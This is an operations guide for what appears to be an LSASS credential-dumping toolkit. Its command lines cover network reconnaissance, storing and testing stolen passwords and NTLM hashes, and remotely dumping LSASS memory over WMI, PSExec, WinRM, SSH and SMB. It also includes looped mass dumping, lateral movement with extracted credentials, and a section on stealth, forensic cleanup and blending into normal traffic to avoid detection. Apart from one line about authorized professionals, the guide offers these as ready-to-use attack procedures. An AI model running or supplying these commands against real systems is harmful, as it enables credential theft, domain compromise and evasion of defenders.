LSASS Remote Dumping Tool - Remote Operations Guide

Table of Contents

1.Remote Operation Overview

2.Network Discovery and Reconnaissance

3.Credential Management

4.Remote Execution Methods

5.Advanced Remote Scenarios

6.Troubleshooting Remote Operations

7.Security and Stealth Considerations

Remote Operation Overview

The LSASS Remote Dumping Tool extends the capabilities of local LSASS dumping to remote Windows systems across networks. This enables authorized security professionals to conduct comprehensive assessments of distributed environments.

Key Remote Features

•
Multiple Execution Methods: WMI, PSExec, WinRM, SSH, SMB

•
Authentication Options: Password, NTLM hash, domain authentication

•
Network Discovery: Automated target identification and scanning

•
Credential Management: Secure storage and testing of authentication data

•
Stealth Operations: Evasive techniques for monitored environments

•
Batch Processing: Automated operations across multiple targets

Remote Operation Workflow

Plain Text


1. Network Discovery → 2. Credential Management → 3. Remote Execution → 4. Results Analysis


Network Discovery and Reconnaissance

Phase 1: Network Scanning

Basic Network Discovery

Bash


# Quick discovery of Windows systems
./lsass_network_scanner.sh -t 192.168.1.0/24 -s quick

# Comprehensive network assessment
./lsass_network_scanner.sh -t 10.0.0.0/16 -s full -T 20 --timeout 5


Stealth Reconnaissance

Bash


# Low-profile scanning for monitored environments
./lsass_network_scanner.sh -t target.domain.com -s stealth -v

# Custom timing for evasion
./lsass_network_scanner.sh -t 192.168.1.0/24 -s stealth --timeout 10


Target File Operations

Bash


# Create target list from various sources
echo -e "192.168.1.100\n192.168.1.101\nserver.domain.com" > targets.txt

# Scan from file
./lsass_network_scanner.sh -t file:targets.txt -s full

# Export discovered targets
grep "OS: windows" ./scan_results/scan_results_*.txt | \
  grep "Target:" | cut -d: -f2 > windows_targets.txt


Phase 2: Target Analysis

Service Enumeration

Bash


# Analyze scan results for specific services
grep -A 10 "SMB Status: smb_available" ./scan_results/scan_results_*.txt
grep -A 10 "WinRM Status: winrm_http" ./scan_results/scan_results_*.txt

# Identify high-value targets
grep -B 5 -A 5 "3389\|5985\|445" ./scan_results/scan_results_*.txt


Priority Target Selection

Bash


# Filter targets by criteria
awk '/Target:/ {target=$2} /OS: windows/ && /445/ {print target}' \
  ./scan_results/scan_results_*.txt > priority_targets.txt

# Create target categories
grep "Domain Controller\|Server" ./scan_results/scan_results_*.txt > dc_servers.txt
grep "Workstation\|Desktop" ./scan_results/scan_results_*.txt > workstations.txt


Credential Management

Phase 1: Credential Collection

Adding Credentials

Bash


# Standard domain credentials
./lsass_credential_manager.sh add -t 192.168.1.100 -u admin -P "P@ssw0rd123" -d CORP

# Local administrator accounts
./lsass_credential_manager.sh add -t 192.168.1.101 -u administrator -P "LocalPass456"

# Service accounts
./lsass_credential_manager.sh add -t server.corp.com -u svc_backup -P "ServicePass789" -d CORP


Hash-based Authentication

Bash


# Generate NTLM hash from password
./lsass_credential_manager.sh hash -P "MyPassword123"

# Add hash-based credentials
./lsass_credential_manager.sh add -t 192.168.1.102 -u admin \
  -H "aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"

# Domain hash authentication
./lsass_credential_manager.sh add -t dc.corp.com -u domain_admin \
  -H "aad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76" -d CORP


Encrypted Credential Storage

Bash


# Enable encryption for sensitive environments
./lsass_credential_manager.sh add -t sensitive.server.com -u admin -P "TopSecret" -e

# Set master password for encryption
export MASTER_PASSWORD="MyMasterPassword123"
./lsass_credential_manager.sh add -t target -u admin -P "password" -e -p "$MASTER_PASSWORD"


Phase 2: Credential Validation

Authentication Testing

Bash


# Test all stored credentials
./lsass_credential_manager.sh test

# Test specific target
./lsass_credential_manager.sh test -t 192.168.1.100 -u admin

# Batch testing with logging
./lsass_credential_manager.sh test > auth_test_results.txt 2>&1


Credential Rotation

Bash


# Export current credentials
./lsass_credential_manager.sh export -f backup_$(date +%Y%m%d).txt

# Update passwords
./lsass_credential_manager.sh delete -t 192.168.1.100 -u admin
./lsass_credential_manager.sh add -t 192.168.1.100 -u admin -P "NewPassword123"

# Verify updated credentials
./lsass_credential_manager.sh test -t 192.168.1.100 -u admin


Remote Execution Methods

Method 1: WMI (Windows Management Instrumentation)

Basic WMI Operations

Bash


# Standard WMI remote dump
./lsass_remote_dumper.sh -r -t 192.168.1.100 -u admin -p "password" -x wmi -m comsvcs

# Domain authentication via WMI
./lsass_remote_dumper.sh -r -t server.corp.com -u admin -p "password" -d CORP -x wmi -m all


Advanced WMI Techniques

Bash


# WMI with custom timeout
./lsass_remote_dumper.sh -r -t 192.168.1.100 -u admin -p "password" \
  -x wmi -m rundll32 --timeout 60

# Stealth WMI operation
./lsass_remote_dumper.sh -r -t target.com -u admin -p "password" \
  -x wmi -m comsvcs -s -c -q


Method 2: PSExec-style Execution

Standard PSExec Operations

Bash


# Basic PSExec remote dump
./lsass_remote_dumper.sh -r -t 192.168.1.101 -u administrator -p "password" \
  -x psexec -m procdump

# Impacket PSExec with hash
./lsass_remote_dumper.sh -r -t 192.168.1.101 -u admin \
  --hash "aad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76" -x psexec -m comsvcs


PSExec Best Practices

Bash


# Use with cleanup for forensics evasion
./lsass_remote_dumper.sh -r -t 192.168.1.101 -u admin -p "password" \
  -x psexec -m rundll32 -c

# Combine with stealth timing
./lsass_remote_dumper.sh -r -t 192.168.1.101 -u admin -p "password" \
  -x psexec -m comsvcs -s -c -q


Method 3: WinRM (Windows Remote Management)

PowerShell Remoting

Bash


# Standard WinRM operation
./lsass_remote_dumper.sh -r -t 192.168.1.102 -u admin -p "password" \
  -x winrm -m powershell

# WinRM with SSL (port 5986)
./lsass_remote_dumper.sh -r -t server.corp.com:5986 -u admin -p "password" \
  -x winrm -m comsvcs


WinRM Configuration

Bash


# Test WinRM connectivity first
winrs -r:192.168.1.102 -u:admin -p:password "echo WinRM Test"

# Configure WinRM if needed (on target)
# winrm quickconfig -force
# winrm set winrm/config/service/auth @{Basic="true"}


Method 4: SSH Execution

SSH-based Remote Operations

Bash


# SSH remote dump (Windows with OpenSSH)
./lsass_remote_dumper.sh -r -t 192.168.1.103 -u admin -p "password" \
  -x ssh -m powershell

# SSH with key-based authentication (if configured)
./lsass_remote_dumper.sh -r -t server.corp.com -u admin \
  -x ssh -m comsvcs --port 22


Method 5: SMB-based Execution

SMB File Operations

Bash


# SMB-based remote dump
./lsass_remote_dumper.sh -r -t 192.168.1.104 -u admin -p "password" \
  -x smb -m comsvcs

# SMB with domain authentication
./lsass_remote_dumper.sh -r -t fileserver.corp.com -u admin -p "password" \
  -d CORP -x smb -m rundll32


Advanced Remote Scenarios

Scenario 1: Domain Controller Assessment

Bash


# Discover domain controllers
./lsass_network_scanner.sh -t corp.domain.com -s full

# Add domain admin credentials
./lsass_credential_manager.sh add -t dc.corp.com -u domain_admin -P "DomainPass123" -d CORP

# Execute comprehensive dump
./lsass_remote_dumper.sh -r -t dc.corp.com -u domain_admin -p "DomainPass123" \
  -d CORP -x winrm -m all -l -f "dc_assessment_$(date +%Y%m%d)"


Scenario 2: Multi-Target Campaign

Bash


# Create target list from network scan
grep "OS: windows" ./scan_results/scan_results_*.txt | \
  awk '{print $2}' | cut -d: -f2 > campaign_targets.txt

# Batch credential addition
while read target; do
    ./lsass_credential_manager.sh add -t "$target" -u admin -P "CommonPass123"
done < campaign_targets.txt

# Execute batch remote dumps
while read target; do
    echo "Processing $target..."
    ./lsass_remote_dumper.sh -r -t "$target" -u admin -p "CommonPass123" \
      -x wmi -m comsvcs -s -c -q -f "campaign_${target//\./_}"
    sleep 30  # Delay between targets
done < campaign_targets.txt


Scenario 3: Lateral Movement Simulation

Bash


# Start with initial foothold
./lsass_remote_dumper.sh -r -t 192.168.1.100 -u user -p "password" \
  -x winrm -m powershell -l

# Extract credentials from dump (manual analysis)
# Use extracted credentials for next hop

# Add discovered credentials
./lsass_credential_manager.sh add -t 192.168.1.101 -u admin -P "ExtractedPass"

# Continue lateral movement
./lsass_remote_dumper.sh -r -t 192.168.1.101 -u admin -p "ExtractedPass" \
  -x wmi -m all -s -c


Scenario 4: High-Security Environment

Bash


# Maximum stealth configuration
export STEALTH_MODE=true
export CLEANUP_MODE=true
export QUIET_MODE=true

# Stealth network discovery
./lsass_network_scanner.sh -t 192.168.1.0/24 -s stealth --timeout 10

# Encrypted credential storage
./lsass_credential_manager.sh add -t target -u admin -P "password" -e

# Stealth remote operation with delays
./lsass_remote_dumper.sh -r -t target -u admin -p "password" \
  -x wmi -m comsvcs -s -c -q --timeout 120


Troubleshooting Remote Operations

Common Remote Issues

Connection Problems

Bash


# Test basic connectivity
ping -c 3 192.168.1.100
telnet 192.168.1.100 445

# Test specific services
nc -zv 192.168.1.100 135  # WMI
nc -zv 192.168.1.100 5985 # WinRM
nc -zv 192.168.1.100 22   # SSH


Authentication Failures

Bash


# Verify credentials manually
smbclient -L //192.168.1.100 -U admin%password

# Test WinRM authentication
winrs -r:192.168.1.100 -u:admin -p:password "whoami"

# Check domain authentication
smbclient -L //server.corp.com -U CORP\\admin%password


Permission Issues

Bash


# Verify administrative access
./lsass_remote_dumper.sh -r -t 192.168.1.100 -u admin -p "password" \
  -x wmi -m comsvcs -v

# Check UAC settings on target
# reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA

# Test with different execution method
./lsass_remote_dumper.sh -r -t 192.168.1.100 -u admin -p "password" \
  -x psexec -m rundll32


Debugging Remote Operations

Enable Verbose Logging

Bash


# Enable detailed logging
./lsass_remote_dumper.sh -r -t target -u admin -p "password" \
  -x wmi -m comsvcs -l -v

# Check log files
tail -f ./dumps/lsass_remote_dumper.log

# Debug network scanner
./lsass_network_scanner.sh -t target -s full -v


Network Troubleshooting

Bash


# Check firewall rules
# netsh advfirewall firewall show rule name=all | findstr 135
# netsh advfirewall firewall show rule name=all | findstr 5985

# Test with different ports
./lsass_remote_dumper.sh -r -t target:5986 -u admin -p "password" -x winrm

# Use alternative execution methods
./lsass_remote_dumper.sh -r -t target -u admin -p "password" -x ssh


Performance Optimization

Timeout Configuration

Bash


# Increase timeouts for slow networks
./lsass_remote_dumper.sh -r -t target -u admin -p "password" \
  -x wmi -m comsvcs --timeout 120

# Optimize for fast networks
./lsass_remote_dumper.sh -r -t target -u admin -p "password" \
  -x winrm -m powershell --timeout 15


Parallel Operations

Bash


# Process multiple targets in parallel
targets=("192.168.1.100" "192.168.1.101" "192.168.1.102")

for target in "${targets[@]}"; do
    (
        ./lsass_remote_dumper.sh -r -t "$target" -u admin -p "password" \
          -x wmi -m comsvcs -s -c -q
    ) &
done

wait  # Wait for all background jobs to complete


Security and Stealth Considerations

Operational Security (OPSEC)

Network-Level Stealth

Bash


# Use stealth scanning techniques
./lsass_network_scanner.sh -t target_range -s stealth

# Randomize timing between operations
sleep $((RANDOM % 60 + 30))  # Random delay 30-90 seconds

# Use legitimate-looking operations
./lsass_remote_dumper.sh -r -t target -u admin -p "password" \
  -x winrm -m comsvcs -s -c -q


Host-Level Evasion

Bash


# Use built-in Windows tools only
./lsass_remote_dumper.sh -r -t target -u admin -p "password" \
  -x wmi -m comsvcs

# Immediate cleanup
./lsass_remote_dumper.sh -r -t target -u admin -p "password" \
  -x wmi -m rundll32 -c

# Randomize output filenames
./lsass_remote_dumper.sh -r -t target -u admin -p "password" \
  -x wmi -m comsvcs -f "temp_$(date +%s)"


Traffic Analysis Evasion

Bash


# Use encrypted channels
./lsass_remote_dumper.sh -r -t target:5986 -u admin -p "password" \
  -x winrm -m powershell  # WinRM over HTTPS

# Blend with normal traffic
# Execute during business hours
# Use standard administrative accounts
# Follow normal operational patterns


